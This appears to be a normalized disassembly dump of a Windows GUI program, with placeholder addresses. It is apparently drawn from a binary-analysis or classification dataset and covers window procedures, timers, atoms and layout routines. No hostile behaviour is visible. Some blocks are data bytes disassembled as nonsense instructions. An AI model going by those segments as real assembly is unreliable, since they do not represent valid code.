call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_426290
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_4262b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426300
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426307
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_40326c
call sub_42596c
cmp [ rw-data ] 0x0
jg r-xdata
sub_426328
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42634d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426354
retn
sub_426360
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426385
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42638c
retn
sub_426398
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4263bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263c4
retn
sub_4263d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4263f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263fc
retn
sub_426408
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42642d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426434
retn
sub_426440
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426465
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42646c
retn
sub_426478
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42649d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264a4
retn
sub_4264b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4264d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264dc
retn
sub_4264e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42650d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426514
retn
sub_42662b
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
dec edi
outsd
outsb
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419380
mov [ esi + 0x30 ] 0x1
push esi
add esp 0xfffffff0
call sub_403590
push sub_426768
call sub_41a410
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
js r-xdata
mov eax esi
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
fcom [ eax ]
inc ecx
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
pop esi
pop ebx
retn
outsb
push ebx
push 0x5653776f
test dl dl
je r-xdata
fcom [ eax ]
inc ecx
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
sub_4266d4
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193cc
test bl bl
jle r-xdata
call sub_41a4a8
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_426708
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_45ee48
mov cl 0x1
sub_426730
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4034bc
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_426768
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426792
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_426800
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_455740
mov [ ebp - 0x14 ] eax
call sub_45565c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4268c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e738
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_426895
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42689c
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e794
retn
sub_42689c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4268ca
mov eax [ ebp - 0x14 ]
call sub_4557f4
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_455664
retn
sub_4269a0
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408b14
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_426a3b
add [ edi ] cl
add [ eax ] al
add [ eax - 0x7fffb929 ] dl
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
mov edi ss
inc esi
add [ eax + 0x46e0 ] dh
add [ eax ] al
add [ eax + 0x5c0046d7 ] cl
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
test bh dl
inc esi
add [ eax + 0x46e1 ] bh
add [ eax ] al
add [ eax - 0x33ffb929 ] al
loopne r-xdata
loop r-xdata
add [ eax ] al
inc [ rw-data ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + edx * 8 ] dh
inc esi
add al cl
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
xor bh dl
inc esi
add [ eax + 0x46e1 ] ah
add [ eax ] al
add [ edi + edx * 8 ] ch
inc esi
add al ah
loope r-xdata
add [ eax ] al
add [ edi + edx * 8 + 0x46 ] bh
add [ eax + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x29 ] bh
inc esi
add [ eax - 0x1f ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + edx * 8 + 0x46 ] dh
add ah al
fild [ esi ]
add [ eax ] al
add [ eax ] al
jo r-xdata
inc esi
add [ eax + 0x46 ] al
add [ eax ] al
insb
xlat
inc esi
add al ch
fild [ esi ]
add [ eax ] al
add [ eax ] al
push 0x380046d7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b4d
retn
cmp [ rw-data ] 0x0
je r-xdata
or eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
xlat
inc esi
add [ eax ] ch
loopne r-xdata
mov edx [ r-xdata ]
call sub_404a44
mov eax rw-data
mov ecx 0xb
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_426b46
push [ fs : eax ]
mov [ fs : eax ] esp
sub_426b50
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d90
call sub_4269a0
mov eax [ r-xdata ]
call sub_413204
mov eax [ r-xdata ]
call sub_4132a4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
sub_428600
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_4286ac
mov eax [ esi + 0x34 ]
call sub_41a580
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193cc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_428638
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_428672
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4286ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42872b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428732
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
sub_4288ec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_436f04
mov edx edi
mov eax [ esi + 0x210 ]
call sub_41386c
xor edx edx
mov eax edi
call sub_43dde4
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_43e038
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_428d1c
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_428970
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_413b0c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440548
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_4289a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_428a0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437204
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_428a12
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e9a8
call sub_403a74
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428a38
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4436dc
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403468
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_428a78
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_443524
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403468
pop edx
pop esi
pop ebx
retn
sub_428aa4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4334e0
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_428d54
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_428b34
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_428dc8
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_40326c
mov eax [ esi + 0x210 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44641c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_428b84
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41c6a8
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_428d0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_4446f8
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_43dde4
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_43d8c8
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_4139c8
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403468
test al al
je r-xdata
sub_428d1c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413a24
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_43dad0
mov eax ebx
mov si 0xffeb
call sub_403468
sub_428d54
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_428ecc
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_428dc8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4288ec
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_413ab0
call sub_40326c
pop edi
pop esi
pop ebx
retn
sub_428e08
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_428b84
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_428e40
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_4139c8
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4139c8
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_428ecc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_428f95
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_428dc8
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_428b84
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428f9c
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_4139c8
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4139c8
pop edx
call sub_43def4
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_428fa4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_443be4
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4139c8
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_429018
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445940
mov [ esi + 0x16c ] 0x1
mov dl 0x3
mov eax esi
call sub_43d3d8
mov edx 0x3
mov eax esi
call sub_43d680
mov dx 0xfff2
mov eax esi
call sub_43e0d0
mov [ esi + 0x188 ] 0x1e
mov [ esi + 0x1a8 ] 0x3
mov [ esi + 0x1a0 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_429090
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x170 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44599c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_4290c0
push ebx
push esi
mov ebx eax
push 0x412
push 0x0
mov eax [ ebx + 0x30 ]
call sub_4446f8
push eax
call GetDCEx
mov [ ebx + 0x180 ] eax
cmp [ ebx + 0x1a8 ] 0x3
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
mov eax [ ebx + 0x170 ]
call sub_41ce94
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
mov [ ebx + 0x1a4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ccb8
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx 0xffffff
xor eax eax
call sub_423670
mov edx eax
mov eax esi
call sub_41ce34
sub_42913c
push ebx
add esp 0xfffffff8
mov ebx eax
mov al [ ebx + 0x184 ]
xor al 0x1
mov [ ebx + 0x184 ] al
mov ecx esp
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41256c
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x1ac ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x40 ]
add eax [ ebx + 0x1ac ]
mov [ esp ] eax
jmp r-xdata
push 0x5a0049
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call PatBlt
pop ecx
pop edx
pop ebx
retn
sub_4291a8
push ebx
mov ebx eax
mov eax [ ebx + 0x1a4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
mov eax [ ebx + 0x30 ]
call sub_4446f8
push eax
call ReleaseDC
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
pop ebx
retn
call sub_40326c
xor eax eax
mov [ ebx + 0x170 ] eax
sub_4291f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi eax
xor ebx ebx
mov ecx esp
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_41256c
mov al [ esi + 0x5b ]
dec al
je r-xdata
dec [ esp + 0x4 ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esi + 0x30 ]
call sub_441428
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esi + 0x4c ]
add [ esp + 0x4 ] eax
dec al
je r-xdata
xor ebx ebx
inc edi
xor ebp ebp
dec [ esp ]
jmp r-xdata
dec al
je r-xdata
inc ebp
dec edi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ esi + 0x48 ]
add [ esp ] eax
jmp r-xdata
jmp r-xdata
mov edx ebp
mov eax [ esi + 0x30 ]
call sub_4413ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_43d864
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x8 ]
jne r-xdata
mov eax ebx
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
sub eax [ esp + 0xc ]
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
dec [ esp + 0x8 ]
jmp r-xdata
sub al 0x2
jne r-xdata
dec [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x14 ]
sub_4292dc
push ebx
mov ebx eax
mov eax ebx
call sub_43d2d0
mov ax [ ebx + 0x78 ]
cmp ax 0xfff1
je r-xdata
mov al [ ebx + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp ax 0xfff2
jne r-xdata
mov dx 0xfff2
mov eax ebx
call sub_43e0d0
mov dx 0xfff1
mov eax ebx
call sub_43e0d0
jmp r-xdata
pop ebx
retn
sub_429318
push ebx
push esi
add esp 0xffffffe0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x160 ]
